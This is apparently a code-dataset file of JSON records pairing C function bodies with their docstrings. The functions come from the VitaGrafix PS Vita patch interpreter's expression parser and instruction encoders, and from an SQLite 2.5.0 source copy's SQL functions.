{"docstring": "// VG_IoParseState vgPatchParseGenValue()\n", "func_signal": "intp_status_t legacy_parse_gen_value(\n        const char chunk[], int pos, int end,\n        uint32_t *value)", "code": "{\n    intp_status_t ret = {INTP_STATUS_OK, 0};\n\n    // Check for macros\n    if (chunk[pos] == '<') {\n#ifdef BUILD_VITAGRAFIX\n        if (!strncasecmp(&chunk[pos], \"<fb_w>\", 6)) {\n            *value = g_main.config.fb.width;\n            return ret;\n        }\n        if (!strncasecmp(&chunk[pos], \"<fb_h>\", 6)) {\n            *value = g_main.config.fb.height;\n            return ret;\n        }\n        if (!strncasecmp(&chunk[pos], \"<ib_w\", 5)) {\n            if (chunk[pos + 5] == '>') {\n                *value = g_main.config.ib[0].width;\n                return ret;\n            }\n            else if (chunk[pos + 5] == ',') {\n                uint8_t ib_n = strtoul(&chunk[pos + 6], NULL, 10);\n                if (ib_n >= MAX_RES_COUNT) {\n                    vg_log_printf(\"[PATCH] ERROR: Accessed [%u] IB res out of range!\\n\", ib_n);\n                    __intp_ret_status(INTP_STATUS_ERROR_VG_IB_OOB, pos + 6);\n                }\n\n                *value = g_main.config.ib[ib_n].width;\n                return ret;\n            }\n        }\n        if (!strncasecmp(&chunk[pos], \"<ib_h\", 5)) {\n            if (chunk[pos + 5] == '>') {\n                *value = g_main.config.ib[0].height;\n                return ret;\n            }\n            else if (chunk[pos + 5] == ',') {\n                uint8_t ib_n = strtoul(&chunk[pos + 6], NULL, 10);\n                if (ib_n >= MAX_RES_COUNT) {\n                    vg_log_printf(\"[PATCH] ERROR: Accessed [%u] IB res out of range!\\n\", ib_n);\n                    __intp_ret_status(INTP_STATUS_ERROR_VG_IB_OOB, pos + 6);\n                }\n\n                *value = g_main.config.ib[ib_n].height;\n                return ret;\n            }\n        }\n        if (!strncasecmp(&chunk[pos], \"<vblank>\", 8)) {\n            *value = g_main.config.fps == FPS_60 ? 1 :\n                    (g_main.config.fps == FPS_30 ? 2 : 3);\n            return ret;\n        }\n        if (!strncasecmp(&chunk[pos], \"<msaa>\", 6)) {\n            *value = g_main.config.msaa == MSAA_4X ? 2 :\n                    (g_main.config.msaa == MSAA_2X ? 1 : 0);\n            return ret;\n        }\n        if (!strncasecmp(&chunk[pos], \"<msaa_enabled>\", 14)) {\n            *value = g_main.config.msaa_enabled == FT_ENABLED;\n            return ret;\n        }\n#endif\n        if (!strncasecmp(&chunk[pos], \"<+,\", 3) ||\n                !strncasecmp(&chunk[pos], \"<-,\", 3) ||\n                !strncasecmp(&chunk[pos], \"<*,\", 3) ||\n                !strncasecmp(&chunk[pos], \"</,\", 3) ||\n                !strncasecmp(&chunk[pos], \"<&,\", 3) ||\n                !strncasecmp(&chunk[pos], \"<|,\", 3) ||\n                !strncasecmp(&chunk[pos], \"<l,\", 3) ||\n                !strncasecmp(&chunk[pos], \"<r,\", 3) ||\n                !strncasecmp(&chunk[pos], \"<min,\", 5) ||\n                !strncasecmp(&chunk[pos], \"<max,\", 5)) {\n            int token_pos = pos + 3;\n            if (tolower(chunk[pos + 1]) == 'm') {\n                token_pos += 2;\n            }\n            uint32_t a, b;\n\n            ret = legacy_parse_gen_value(chunk, token_pos, end, &a);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            token_pos = legacy_get_next_macro_arg_pos(chunk, token_pos, end);\n            ret = legacy_parse_gen_value(chunk, token_pos, end, &b);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            if (chunk[pos + 1] == '+')\n                *value = a + b;\n            else if (chunk[pos + 1] == '-')\n                *value = a - b;\n            else if (chunk[pos + 1] == '*')\n                *value = a * b;\n            else if (chunk[pos + 1] == '/')\n                *value = a / b;\n            else if (chunk[pos + 1] == '&')\n                *value = a & b;\n            else if (chunk[pos + 1] == '|')\n                *value = a | b;\n            else if (tolower(chunk[pos + 1]) == 'l')\n                *value = a << b;\n            else if (tolower(chunk[pos + 1]) == 'r')\n                *value = a >> b;\n            else if (tolower(chunk[pos + 1]) == 'm' && tolower(chunk[pos + 3]) == 'n')\n                *value = a < b ? a : b;\n            else if (tolower(chunk[pos + 1]) == 'm' && tolower(chunk[pos + 3]) == 'x')\n                *value = a > b ? a : b;\n            return ret;\n        }\n        if (!strncasecmp(&chunk[pos], \"<to_fl,\", 7)) {\n            uint32_t a;\n\n            ret = legacy_parse_gen_value(chunk, pos + 7, end, &a);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            float a_fl = (float)a;\n            memcpy(value, &a_fl, sizeof(uint32_t));\n            return ret;\n        }\n        if (!strncasecmp(&chunk[pos], \"<if_eq,\", 7) ||\n                !strncasecmp(&chunk[pos], \"<if_gt,\", 7) ||\n                !strncasecmp(&chunk[pos], \"<if_lt,\", 7) ||\n                !strncasecmp(&chunk[pos], \"<if_ge,\", 7) ||\n                !strncasecmp(&chunk[pos], \"<if_le,\", 7)) {\n            int token_pos = pos + 7;\n            uint32_t a, b, c, d;\n\n            ret = legacy_parse_gen_value(chunk, token_pos, end, &a);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            token_pos = legacy_get_next_macro_arg_pos(chunk, token_pos, end);\n            ret = legacy_parse_gen_value(chunk, token_pos, end, &b);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            token_pos = legacy_get_next_macro_arg_pos(chunk, token_pos, end);\n            ret = legacy_parse_gen_value(chunk, token_pos, end, &c);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            token_pos = legacy_get_next_macro_arg_pos(chunk, token_pos, end);\n            ret = legacy_parse_gen_value(chunk, token_pos, end, &d);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            if (tolower(chunk[pos + 4]) == 'e') {\n                *value = a == b ? c : d;\n            } else if (tolower(chunk[pos + 4]) == 'g') {\n                if (tolower(chunk[pos + 5]) == 't') {\n                    *value = a > b ? c : d;\n                } else {\n                    *value = a >= b ? c : d;\n                }\n            } else if (tolower(chunk[pos + 4]) == 'l') {\n                if (tolower(chunk[pos + 5]) == 't') {\n                    *value = a < b ? c : d;\n                } else {\n                    *value = a <= b ? c : d;\n                }\n            }\n            return ret;\n        }\n\n        __intp_ret_status(INTP_STATUS_ERROR_SYNTAX, pos); // Invalid macro\n    }\n\n    // Regular value\n    *value = strtoul(&chunk[pos], NULL, 0);\n    return ret;\n}", "path": "src\\interpreter\\legacy.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Cast current value to another data type\n *         raw data can have arbitrary size\n *         primitives are always padded to 32bit\n *\n * @param lhs              value to cast\n * @param data_type        target data type\n */\n", "func_signal": "void value_cast(value_t *lhs, value_data_type_t data_type)", "code": "{\n    if (lhs->type == data_type)\n        goto ALIGN_SIZE; // nothing to do\n\n    // * -> bytes\n    if (data_type == DATA_TYPE_RAW) {\n        lhs->type = DATA_TYPE_RAW;\n        goto ALIGN_SIZE;\n    }\n\n    // bytes -> *\n    if (lhs->type == DATA_TYPE_RAW) {\n        lhs->type = data_type;\n        memset(lhs->unk, 0, MAX_VALUE_SIZE * sizeof(bool));\n        goto ALIGN_SIZE;\n    }\n\n    // * -> *\n    switch (lhs->type) {\n        case DATA_TYPE_SIGNED:\n            switch (data_type) {\n                default: break; // stfu\n                case DATA_TYPE_UNSIGNED: // signed -> unsigned\n                    lhs->data.uint32 = (uint32_t)lhs->data.int32;\n                    break;\n                case DATA_TYPE_FLOAT:    // signed -> float\n                    lhs->data.fl32 = (float)lhs->data.int32;\n                    break;\n            }\n            break;\n        case DATA_TYPE_UNSIGNED:\n            switch (data_type) {\n                default: break; // stfu\n                case DATA_TYPE_SIGNED:   // unsigned -> signed\n                    lhs->data.int32 = (int32_t)lhs->data.uint32;\n                    break;\n                case DATA_TYPE_FLOAT:    // unsigned -> float\n                    lhs->data.fl32 = (float)lhs->data.uint32;\n                    break;\n            }\n            break;\n         case DATA_TYPE_FLOAT:\n            switch (data_type) {\n                default: break; // stfu\n                case DATA_TYPE_SIGNED:   // float -> signed\n                    lhs->data.int32 = (int32_t)lhs->data.fl32;\n                    break;\n                case DATA_TYPE_UNSIGNED: // float -> unsigned\n                    lhs->data.uint32 = (uint32_t)lhs->data.fl32;\n                    break;\n            }\n            break;\n        default: break; // stfu\n    }\n\n    lhs->type = data_type;\n\nALIGN_SIZE:\n    if (lhs->type != DATA_TYPE_RAW)\n        lhs->size = 4;\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Parse and evaluate single function call or constant\n *\n * @param expr             given expression\n * @param pos              starting position in given expression (offset)\n * @param value            OUT - value\n * @param allow_brckt_next allow closing bracket ')' after constant, e.g. 'pi)'\n *\n * @return status\n */\n", "func_signal": "intp_status_t parse_call(const char *expr, uint32_t *pos, value_t *value, bool allow_brckt_next)", "code": "{\n    const token_t *token;\n    intp_status_t ret;\n    uint32_t pos_error = 0;\n    uint32_t pos_fn_begin = *pos;\n\n    // Parse the function name\n    ret = parse_token(expr, pos, value, &token, false, false);\n    if (ret.code != INTP_STATUS_OK)\n        return ret;\n\n    // Constant?\n    if ((token->flags & TOKEN_CONSTANT) && token->op != NULL) {\n        // Apply op\n        bool op_ret = ((bool (*)(value_t *))(token->op))(value);\n        if (!op_ret)\n            __intp_ret_status(INTP_STATUS_ERROR_INVALID_DATATYPE, pos_fn_begin);\n\n        // Peek next token\n        ret = peek_token(expr, *pos, NULL, &token, false, false);\n        if (ret.code != INTP_STATUS_OK)\n            return ret;\n\n#ifdef BUILD_LEGACY_SUPPORT\n        // Ignore optional () braces used with constants\n\n        // Is next token opening bracket?\n        if (token->type == TOKEN_BRACKET_OPEN) {\n            // Skip it\n            parse_token(expr, pos, NULL, &token, false, false);\n\n            // Match closing bracket!\n            pos_error = *pos;\n            ret = parse_token(expr, pos, NULL, &token, true, false);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            if (token->type != TOKEN_BRACKET_CLOSE)\n                __intp_ret_status(INTP_STATUS_ERROR_TOO_MANY_ARGS, pos_error);\n        }\n#else\n        // Don't allow 'pi)'\n        if (token->type != TOKEN_INVALID\n                && token->type != TOKEN_TERMINATOR\n                && !(token->flags & TOKEN_INFIX)\n                && (!allow_brckt_next || token->type != TOKEN_BRACKET_CLOSE))\n            __intp_ret_status(INTP_STATUS_ERROR_INVALID_TOKEN, *pos);\n#endif\n    }\n\n    // Function call\n    else if (((token->flags & TOKEN_ARITY_1)\n            || (token->flags & TOKEN_ARITY_2)\n            || (token->flags & TOKEN_ARITY_3)\n            || (token->flags & TOKEN_ARITY_4)) && token->op != NULL) {\n        const token_t *op = token;\n        value_t arg[TOKEN_ARITY_4 - 1];\n        memset(arg, 0, (TOKEN_ARITY_4 - 1) * sizeof(value_t));\n\n        // Check for opening bracket\n        pos_error = *pos;\n        ret = parse_token(expr, pos, NULL, &token, false, false);\n        if (ret.code != INTP_STATUS_OK)\n            return ret;\n\n        // Missing? Fek\n        if (token->type != TOKEN_BRACKET_OPEN)\n            __intp_ret_status(INTP_STATUS_ERROR_MISSING_OPEN_BRACKET, pos_error);\n\n        // Peek and set proper error code if next token is closing bracket,\n        // and not an actual argument\n        ret = peek_token(expr, *pos, NULL, &token, true, (op->flags & TOKEN_FORCE_RAW));\n        if (ret.code != INTP_STATUS_OK)\n            return ret;\n        if (token->type == TOKEN_BRACKET_CLOSE)\n            __intp_ret_status(INTP_STATUS_ERROR_TOO_FEW_ARGS, *pos);\n\n        int argn = TOKEN_GET_ARGN(op);\n\n        // Grab and evaluate first argument\n        if (op->flags & TOKEN_FORCE_RAW)\n            ret = parse_value(expr, pos, value, true, true);\n        else\n            ret = parse_expression(expr, pos, value, false, true);\n        if (ret.code != INTP_STATUS_OK)\n            return ret;\n\n        // Grab and evaluate additional arguments (if necessary)\n        for (int i = 0; i < argn - 1; i++) {\n            // Check for arg. separator token\n            pos_error = *pos;\n            ret = parse_token(expr, pos, NULL, &token, false, false);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            if (token->type != TOKEN_ARGUMENT_SEP)\n                __intp_ret_status(INTP_STATUS_ERROR_TOO_FEW_ARGS, pos_error);\n\n            // Grab and evaluate (i+1)-th argument\n            if (op->flags & TOKEN_FORCE_RAW)\n                ret = parse_value(expr, pos, &arg[i], true, true);\n            else\n                ret = parse_expression(expr, pos, &arg[i], false, true);\n\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n        }\n\n        // Match closing bracket!\n        pos_error = *pos;\n        ret = parse_token(expr, pos, NULL, &token, false, false);\n        if (ret.code != INTP_STATUS_OK)\n            return ret;\n\n        if (token->type == TOKEN_ARGUMENT_SEP)\n            __intp_ret_status(INTP_STATUS_ERROR_TOO_MANY_ARGS, pos_error);\n        if (token->type != TOKEN_BRACKET_CLOSE)\n            __intp_ret_status(INTP_STATUS_ERROR_MISSING_CLOSE_BRACKET, pos_error);\n\n        // Apply op\n        bool op_ret = false;\n        switch (TOKEN_GET_ARGN(op)) {\n            case 1: op_ret = ((bool (*)(value_t *))(op->op))(value); break;\n            case 2: op_ret = ((bool (*)(value_t *, value_t *))(op->op))(value, &arg[0]); break;\n            case 3: op_ret = ((bool (*)(value_t *, value_t *, value_t *))(op->op))(value, &arg[0], &arg[1]); break;\n            case 4: op_ret = ((bool (*)(value_t *, value_t *, value_t *, value_t *))(op->op))(value, &arg[0], &arg[1], &arg[2]); break;\n            default: /*printf(\"DEBUG: Invalid fn argn! %d\\n\", TOKEN_GET_ARGN(op));*/ break;\n        }\n        if (!op_ret)\n            __intp_ret_status(INTP_STATUS_ERROR_INVALID_DATATYPE, pos_fn_begin);\n    }\n\n    __intp_ret_status(INTP_STATUS_OK, *pos);\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Parse raw hex bytes from the expression\n *\n * @param expr             given expression\n * @param pos              position in given expression (offset)\n * @param value            OUT - value\n * @param token            OUT - set to TOKEN_PRIMITIVE\n *\n * @return status\n */\n", "func_signal": "intp_status_t parse_token_raw(const char *expr, uint32_t *pos, value_t *value, const token_t **token)", "code": "{\n    char *endptr = NULL;\n\n    if (value != NULL) {\n        value->type = DATA_TYPE_RAW;\n        value->size = 0;\n    }\n\n    //printf(\"DEBUG: Parsing raw data at %d\\n\", *pos);\n\n    int count = 0;\n    while (isxdigit(expr[*pos])) {\n        if (count >= MAX_VALUE_SIZE) {\n            __intp_ret_status(INTP_STATUS_ERROR_INVALID_DATATYPE, *pos);\n        }\n\n        char byte[3] = {0};\n        memcpy(&byte, &expr[*pos], 2);\n\n        unsigned long tmp = strtoul(byte, &endptr, 16);\n        if (endptr == byte) {\n            //printf(\"Error: invalid format!\\n\");\n            __intp_ret_status(INTP_STATUS_ERROR_INVALID_TOKEN, *pos);\n        }\n\n        count++;\n        (*pos) += endptr - byte;\n        if (value != NULL) {\n            value->data.raw[value->size] = tmp & 0xFF;\n            value->size++;\n        }\n\n        // skip optional space between bytes\n        if (!skip_ws(expr, pos))\n            break; // nothing left to read?\n    }\n\n    if (expr[*pos] == 'r' || expr[*pos] == 'R') (*pos)++; // skip r char\n\n    (*token) = TOKEN(TOKEN_PRIMITIVE);\n\n    //printf(\"DEBUG: Raw data parsed %d\\n\", *pos);\n    __intp_ret_status(INTP_STATUS_OK, *pos);\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/*\n * T1 MOVS <Rd>,#<imm8>    # Outside IT block.\n *    MOV<c> <Rd>,#<imm8>  # Inside IT block.\n *\n * 001            00     xxx xxxxxxxx\n * Move immediate OPcode Rdn imm8\n *\n * byte 1   byte 0\n * 00100xxx xxxxxxxx\n */\n", "func_signal": "bool op_encode_t1_mov(value_t *out, value_t *value)", "code": "{\n    uint8_t reg = (uint8_t)out->data.uint32;\n    memset(out->data.raw, 0, 2);\n    value_raw(out, 2);\n\n    out->data.raw[1] |= 0b00100000;   // Move immediate\n    out->data.raw[1] |= reg;          // Rd\n    out->data.raw[0] |= (uint8_t)value->data.uint32;\n    return true;\n}", "path": "src\\interpreter\\op_encode.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Parse integer from the expression\n *\n * @param expr             given expression\n * @param pos              position in given expression (offset)\n * @param value            OUT - value\n * @param token            OUT - set to TOKEN_PRIMITIVE if token is integer\n *\n * @return status\n */\n", "func_signal": "intp_status_t parse_token_integer(const char *expr, uint32_t *pos, value_t *value, const token_t **token)", "code": "{\n    char *endptr = NULL;\n    long tmp_l;\n    unsigned long tmp_ul;\n    bool is_signed = expr[*pos] == '-' || expr[*pos] == '+';\n\n    if (is_signed)\n        tmp_l = strtol(&expr[*pos], &endptr, 0);\n    else\n        tmp_ul = strtoul(&expr[*pos], &endptr, 0);\n\n    // Found valid integer\n    if (endptr != &expr[*pos]) {\n        (*pos) += endptr - &expr[*pos];\n        (*token) = TOKEN(TOKEN_PRIMITIVE);\n        if (value != NULL) {\n            if (is_signed) {\n                value->type = DATA_TYPE_SIGNED;\n                value->data.int32 = tmp_l;\n            } else {\n                value->type = DATA_TYPE_UNSIGNED;\n                value->data.uint32 = tmp_ul;\n            }\n            value->size = 4;\n        }\n        __intp_ret_status(INTP_STATUS_OK, *pos);\n    }\n\n    __intp_ret_status(INTP_STATUS_ERROR_INVALID_TOKEN, *pos);\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/*\n * T1 MOVT<c> <Rd>,#<imm16>\n *\n * 11110           x 10     1  1    00  xxxx - 0  xxx  xxxx xxxxxxxx\n * Data processing i 16-bit OP Move OP2 imm4   DP imm3 Rd   imm8\n *\n * byte 1   byte 0     byte 3   byte 2\n * 11110x10 1100xxxx - 0xxxxxxx xxxxxxxx\n */\n", "func_signal": "bool op_encode_t1_movt(value_t *out, value_t *value)", "code": "{\n    uint8_t reg = (uint8_t)out->data.uint32;\n    memset(out->data.raw, 0, 4);\n    value_raw(out, 4);\n\n    out->data.raw[1] |= 0b11110010; // Data processing (16-bit)\n    out->data.raw[0] |= 0b11000000; // Move top, plain (16-bit)\n    out->data.raw[3] |= reg;        // Rd\n\n    out->data.raw[0] |= (value->data.uint32 & 0b1111000000000000) >> 12;   // imm4\n    out->data.raw[1] |= (value->data.uint32 & 0b0000100000000000) >> 9;    // i\n    out->data.raw[3] |= (value->data.uint32 & 0b0000011100000000) >> 4;    // imm3\n    out->data.raw[2] |= (value->data.uint32 & 0b0000000011111111);         // imm8\n    return true;\n}", "path": "src\\interpreter\\op_encode.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Parse decimal (aka. float) from the expression\n *\n * @param expr             given expression\n * @param pos              position in given expression (offset)\n * @param value            OUT - value\n * @param token            OUT - set to TOKEN_PRIMITIVE if token is decimal\n *\n * @return status\n */\n", "func_signal": "intp_status_t parse_token_decimal(const char *expr, uint32_t *pos, value_t *value, const token_t **token)", "code": "{\n    char *endptr = NULL;\n    float tmp = strtof(&expr[*pos], &endptr);\n\n    // Found valid float\n    if (endptr != &expr[*pos]) {\n        (*pos) += endptr - &expr[*pos];\n        (*token) = TOKEN(TOKEN_PRIMITIVE);\n        if (value != NULL) {\n            value->type = DATA_TYPE_FLOAT;\n            value->data.fl32 = tmp;\n            value->size = 4;\n        }\n\n        // Skip f char\n        while (isspace(expr[*pos])) { (*pos)++; }\n        if (expr[*pos] == 'f' || expr[*pos] == 'F') (*pos)++;\n        __intp_ret_status(INTP_STATUS_OK, *pos);\n    }\n\n    __intp_ret_status(INTP_STATUS_ERROR_INVALID_TOKEN, *pos);\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Parse and evalute LHS/RHS\n *         if next token is immediate:\n *             return the value\n *\n *         if next token is opening bracket\n *             evaluate inner expression using parse_expression()\n *             match closing bracket\n *             return the value\n *\n *         if next token is function call:\n *             evaluate the function call using parse_call()\n *             return the value\n *\n *         if next token is TOKEN_LEGACY:\n *             evaluate legacy macro\n *             return the value\n *\n * @param expr             given expression\n * @param pos              position in given expression (offset)\n * @param value            OUT - value\n * @param force_raw        force raw hex byte input (if token is immediate value)\n * @param allow_brckt_next allow closing bracket ')' after parsed value\n * @return\n */\n", "func_signal": "intp_status_t parse_value(const char *expr, uint32_t *pos, value_t *value, bool force_raw, bool allow_brckt_next)", "code": "{\n    const token_t *token;\n    intp_status_t ret;\n    uint32_t pos_error;\n    memset(value, 0, sizeof(value_t));\n\n    // Peek first, check if token is function call\n    ret = peek_token(expr, *pos, value, &token, true, force_raw);\n    if (ret.code != INTP_STATUS_OK)\n        return ret;\n\n    // Value has to be a value and cannot start with infix operator or ')'\n    if (token->flags & TOKEN_INFIX\n            || token->type == TOKEN_BRACKET_CLOSE\n            || token->type == TOKEN_INVALID\n            || token->type == TOKEN_TERMINATOR) {\n        skip_ws(expr, pos); // incr. pos to token\n        __intp_ret_status(INTP_STATUS_ERROR_INVALID_TOKEN, *pos);\n    }\n\n    //printf(\"- parse_value(): val: 0x%x, data_type: %d, token_type: %d\\n\", value->data.uint32, value->type, token->type);\n\n#ifdef BUILD_LEGACY_SUPPORT\n    // Legacy backwards compat.\n    if (token->type == TOKEN_LEGACY) {\n        ret = legacy_parse_gen(expr, pos, value);\n        return ret;\n    }\n#endif\n\n    // Function call? Evaluate now!\n    if ((token->flags & TOKEN_CONSTANT) ||\n            (token->flags & TOKEN_ARITY_1) ||\n            (token->flags & TOKEN_ARITY_2) ||\n            (token->flags & TOKEN_ARITY_3) ||\n            (token->flags & TOKEN_ARITY_4)) {\n        return parse_call(expr, pos, value, allow_brckt_next);\n    }\n\n    // Skip the peeked token\n    parse_token(expr, pos, value, &token, true, force_raw);\n\n    // Brackets?\n    if (token->type == TOKEN_BRACKET_OPEN) {\n        // Evaluate inside\n        ret = parse_expression(expr, pos, value, force_raw, true);\n        if (ret.code != INTP_STATUS_OK) return ret;\n\n        // Match closing bracket!\n        pos_error = *pos;\n        ret = parse_token(expr, pos, NULL, &token, true, false);\n        if (ret.code != INTP_STATUS_OK) return ret;\n        if (token->type != TOKEN_BRACKET_CLOSE)\n            __intp_ret_status(INTP_STATUS_ERROR_MISSING_CLOSE_BRACKET, pos_error);\n    }\n\n    else {\n        // Peek next\n        ret = peek_token(expr, *pos, NULL, &token, false, false);\n        if (ret.code != INTP_STATUS_OK)\n            return ret;\n\n        // Don't allow '1)'\n        if (token->type != TOKEN_INVALID\n                    && !(token->flags & TOKEN_INFIX)\n                    && token->type != TOKEN_ARGUMENT_SEP\n                    && token->type != TOKEN_TERMINATOR\n                    && (!allow_brckt_next || token->type != TOKEN_BRACKET_CLOSE)) {\n                __intp_ret_status(INTP_STATUS_ERROR_INVALID_TOKEN, *pos);\n        }\n    }\n\n    // All ok :)\n    __intp_ret_status(INTP_STATUS_OK, *pos);\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Parse single token from the expression\n *         (e.g. term, operator, function name, bracket...)\n *\n * @param expr             given expression\n * @param pos              starting position in given expression (offset)\n * @param value            OUT - parsed immediate value (if any)\n *                          can be set to NULL to ignore\n * @param token            OUT - parsed token\n * @param allow_immediate  parse immediate values\n *                          this is needed to differentiante between:\n *                              '+1' as in + == infix operator, 1 == RHS\n *                              '+1' as in +1 == immediate signed integer\n *                          if set to true, '+1' is treated as immediate value\n * @param force_raw        force raw hex byte input (if token is immediate value)\n *\n * @return status\n */\n", "func_signal": "intp_status_t parse_token(const char *expr, uint32_t *pos, value_t *value, const token_t **token, bool allow_immediate, bool force_raw)", "code": "{\n    (*token) = TOKEN(TOKEN_INVALID);\n\n    if (!skip_ws(expr, pos)) // Invalid token\n        __intp_ret_status(INTP_STATUS_OK, *pos);\n\n    //printf(\"DEBUG: parse_token(): raw?: %d\\n\", force_raw);\n\n    // Immediate value\n    if (allow_immediate && (isxdigit(expr[*pos]) || expr[*pos] == '+' || expr[*pos] == '-')) {\n        uint32_t pos_peek = 0;\n\n        bool is_numeric = false; // integer or decimal\n        bool is_decimal = false; // is_numeric and decimal\n        bool is_raw = false;\n\n        // If not forcing raw input, check input type\n        if (!force_raw) {\n            // Peek digit after optional +/-\n            pos_peek = *pos;\n            //printf(\"DEBUG: pos_peek: %d '%c'\\n\", pos_peek, expr[pos_peek]);\n\n            if (expr[pos_peek] == '-' || expr[pos_peek] == '+') { pos_peek++; }\n            is_numeric = isdigit(expr[pos_peek]);\n\n            // Peek . or f character (check if decimal)\n            while (isdigit(expr[pos_peek])) { pos_peek++; }\n            is_decimal = is_numeric && expr[pos_peek] == '.';\n            if (!is_decimal) {\n                while (isspace(expr[pos_peek])) { pos_peek++; }\n                is_decimal = is_numeric && (expr[pos_peek] == 'f' || expr[pos_peek] == 'F');\n            }\n\n            // Peek r character (check if raw)\n            pos_peek = *pos;\n            while (isxdigit(expr[pos_peek]) || isspace(expr[pos_peek])) { pos_peek++; }\n            is_raw = expr[pos_peek] == 'r' || expr[pos_peek] == 'R';\n\n            //printf(\"DEBUG: numeric: %d, decimal: %d, raw: %d, force: %d\\n\", is_numeric, is_decimal, is_raw, force_raw);\n        }\n\n        // Raw data\n        if (is_raw || force_raw) {\n            return parse_token_raw(expr, pos, value, token);\n        }\n        // Decimal number\n        else if (is_decimal) {\n            return parse_token_decimal(expr, pos, value, token);\n        }\n        // Integer number\n        else if (is_numeric) {\n            return parse_token_integer(expr, pos, value, token);\n        }\n    }\n\n    // Tokens\n    for (int i = 0; i < TOKEN_INVALID; i++) {\n        if (_TOKENS[i].string == NULL)\n            continue;\n\n        size_t token_len = strlen(_TOKENS[i].string);\n\n        if (!strncasecmp(&expr[*pos], _TOKENS[i].string, token_len)) {\n            //printf(\"DEBUG: Found token '%c' %d after-pos:%d\\n\", expr[*pos], i, *pos);\n\n            (*pos) += token_len;\n            (*token) = TOKEN(i);\n\n            __intp_ret_status(INTP_STATUS_OK, *pos);\n            //printf(\"DEBUG: After ret!\\n\");\n        }\n    }\n\n    __intp_ret_status(INTP_STATUS_ERROR_INVALID_TOKEN, *pos);\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Parse and evaluate expression\n *         e.g. '3 * (4 - 2) + 14'\n *\n * @param expr             given expression\n * @param pos              position in given expression (offset)\n * @param value            OUT - value\n * @param force_raw        force raw hex byte input\n * @param allow_brckt_next allow bracket after 1st lhs, e.g. '1)'\n *\n * @return status\n */\n", "func_signal": "intp_status_t parse_expression(const char *expr, uint32_t *pos, value_t *value, bool force_raw, bool allow_brckt_next)", "code": "{\n    intp_status_t ret;\n\n    //printf(\"DEBUG: parse_expression(): Raw?: %d\\n\", force_raw);\n\n    // Parse LHS\n    ret = parse_value(expr, pos, value, force_raw, allow_brckt_next);\n    if (ret.code != INTP_STATUS_OK)\n        return ret;\n\n    // Go!\n    ret = parse_subtree(expr, pos, value, 0);\n    return ret;\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/*\n** Implementation of the IFNULL(), NVL(), and COALESCE() functions.  \n** All three do the same thing.  They return the first argument\n** non-NULL argument.\n*/\n", "func_signal": "static void ifnullFunc(sqlite_func *context, int argc, const char **argv)", "code": "{\n  int i;\n  for(i=0; i<argc; i++){\n    if( argv[i] ){\n      sqlite_set_result_string(context, argv[i], -1);\n      break;\n    }\n  }\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Implementation of the abs() function\n*/\n", "func_signal": "static void absFunc(sqlite_func *context, int argc, const char **argv)", "code": "{\n  const char *z;\n  assert( argc==1 );\n  z = argv[0];\n  if( z==0 ) return;\n  if( z[0]=='-' && isdigit(z[1]) ) z++;\n  sqlite_set_result_string(context, z, -1);\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Implementation of the last_insert_rowid() SQL function.  The return\n** value is the same as the sqlite_last_insert_rowid() API function.\n*/\n", "func_signal": "static void last_insert_rowid(sqlite_func *context, int arg, const char **argv)", "code": "{\n  sqlite *db = sqlite_user_data(context);\n  sqlite_set_result_int(context, sqlite_last_insert_rowid(db));\n}", "path": "src\\func.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
{"docstring": "/*\n** Name of the connection operator, used for error messages.\n*/\n", "func_signal": "static const char *selectOpName(int id)", "code": "{\n  char *z;\n  switch( id ){\n    case TK_ALL:       z = \"UNION ALL\";   break;\n    case TK_INTERSECT: z = \"INTERSECT\";   break;\n    case TK_EXCEPT:    z = \"EXCEPT\";      break;\n    default:           z = \"UNION\";       break;\n  }\n  return z;\n}", "path": "src\\select.c", "repo_name": "davideuler/SQLite-2.5.0-for-code-reading", "stars": 261, "license": "None", "language": "c", "size": 753}
